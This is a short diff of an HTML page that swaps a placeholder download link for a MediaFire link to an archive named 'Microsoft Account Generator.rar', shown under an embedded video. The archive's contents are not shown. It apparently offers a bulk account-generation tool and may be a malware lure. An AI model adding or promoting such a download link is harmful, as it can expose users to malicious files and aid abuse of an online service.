@@ -73,7 +73,7 @@
   <!-- Second video container with download button -->
   <div class="video-container">
     <iframe allowfullscreen="" src="https://imgur.com/a/b2LSrYf" controls="" tabindex="-1"></iframe>
-    <p><a class="download-button" href="https://www.mediafire.com/file/your-second-download-link" id="downloadButton2" rel="nofollow">Download (Video 2)</a></p>
+    <p><a class="download-button" href="https://www.mediafire.com/file/zd2txyjkpfta885/Microsoft+Account+Generator.rar/file" id="downloadButton2" rel="nofollow">Download (Video 2)</a></p>
   </div>
 </body>
 </html>
